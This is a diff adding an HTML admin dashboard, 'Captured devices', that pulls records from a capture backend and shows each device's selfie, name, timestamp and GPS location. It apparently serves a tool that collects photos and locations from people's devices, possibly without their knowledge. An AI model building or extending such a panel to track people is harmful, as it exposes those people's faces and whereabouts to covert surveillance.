@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin – Captures</title>
+  <style>
+    * { box-sizing: border-box; }
+    body { font-family: system-ui, Arial, sans-serif; background: #0f0f0f; color: #eee; margin: 0; padding: 20px; }
+    h1 { font-size: 22px; margin-bottom: 16px; }
+    .toolbar { display: flex; gap: 12px; margin-bottom: 16px; align-items: center; }
+    .toolbar input { padding: 8px 10px; border-radius: 8px; border: 1px solid #333; background: #1a1a1a; color: #eee; }
+    .toolbar button { padding: 8px 14px; border-radius: 8px; border: none; background: #3ea6ff; color: #000; font-weight: 600; cursor: pointer; }
+    .toolbar button:hover { background: #5cb8ff; }
+    table { width: 100%; border-collapse: collapse; background: #141414; border-radius: 10px; overflow: hidden; }
+    th, td { text-align: left; padding: 10px 12px; border-bottom: 1px solid #222; font-size: 14px; vertical-align: middle; }
+    th { background: #1c1c1c; font-weight: 600; font-size: 13px; color: #aaa; }
+    tr:hover td { background: #181818; }
+    .selfie { width: 56px; height: 56px; border-radius: 8px; object-fit: cover; cursor: pointer; border: 1px solid #333; }
+    .map-link { color: #3ea6ff; text-decoration: none; }
+    .map-link:hover { text-decoration: underline; }
+    .label-input { width: 140px; padding: 6px 8px; border-radius: 6px; border: 1px solid #333; background: #1a1a1a; color: #eee; }
+    .label-input:focus { outline: 1px solid #3ea6ff; }
+    .empty { padding: 40px; text-align: center; color: #888; }
+    .small { font-size: 12px; color: #888; }
+    #modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); align-items: center; justify-content: center; z-index: 9999; padding: 20px; }
+    #modal img { max-width: 90vw; max-height: 90vh; border-radius: 10px; }
+    #modal.close { display: none; }
+  </style>
+</head>
+<body>
+  <h1>📸 Captured devices</h1>
+  <div class="toolbar">
+    <button onclick="load()">🔄 Refresh</button>
+    <span class="small" id="count"></span>
+  </div>
+
+  <table id="table">
+    <thead>
+      <tr>
+        <th>Selfie</th>
+        <th>Device</th>
+        <th>Label (editable)</th>
+        <th>Date / Time</th>
+        <th>Location</th>
+      </tr>
+    </thead>
+    <tbody id="rows"></tbody>
+  </table>
+
+  <div id="modal" onclick="this.style.display='none'">
+    <img id="modalImg" src="" alt="">
+  </div>
+
+<script>
+const API = 'https://my-capture-backend.onrender.com';
+
+async function load() {
+  const rowsEl = document.getElementById('rows');
+  rowsEl.innerHTML = '<tr><td colspan="5" class="empty">Loading…</td></tr>';
+  try {
+    const res = await fetch(API + '/api/captures');
+    const json = await res.json();
+    if (!json.success) throw new Error(json.error || 'Error');
+    const data = json.data || [];
+    document.getElementById('count').textContent = data.length + ' record(s)';
+    if (!data.length) {
+      rowsEl.innerHTML = '<tr><td colspan="5" class="empty">No captures yet.</td></tr>';
+      return;
+    }
+    rowsEl.innerHTML = data.map(r => {
+      const name = r.device_label || r.device_name || 'Unknown';
+      const dt = new Date(r.created_at).toLocaleString();
+      const map = (r.lat && r.lng)
+        ? `<a class="map-link" target="_blank" href="https://www.google.com/maps?q=${r.lat},${r.lng}">${r.lat.toFixed(4)}, ${r.lng.toFixed(4)}</a>`
+        : '<span class="small">—</span>';
+      const selfie = r.selfie_url
+        ? `<img class="selfie" src="${r.selfie_url}" onclick="openModal('${r.selfie_url}')" />`
+        : '<span class="small">—</span>';
+      return `<tr data-id="${r.id}">
+        <td>${selfie}</td>
+        <td>${escapeHtml(r.device_name || 'Unknown')}</td>
+        <td><input class="label-input" value="${escapeHtml(name)}" onblur="rename('${r.id}', this.value)" /></td>
+        <td>${dt}</td>
+        <td>${map}</td>
+      </tr>`;
+    }).join('');
+  } catch (e) {
+    rowsEl.innerHTML = `<tr><td colspan="5" class="empty">Error: ${escapeHtml(e.message)}</td></tr>`;
+  }
+}
+
+async function rename(id, label) {
+  try {
+    await fetch(API + '/api/captures/' + id, {
+      method: 'PATCH',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ device_label: label })
+    });
+  } catch (e) { alert('Rename failed: ' + e.message); }
+}
+
+function openModal(url) {
+  document.getElementById('modalImg').src = url;
+  document.getElementById('modal').style.display = 'flex';
+}
+
+function escapeHtml(s) {
+  return String(s).replace(/[&<>"']/g, c => ({
+    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
+  })[c]);
+}
+
+load();
+</script>
+</body>
+</html>
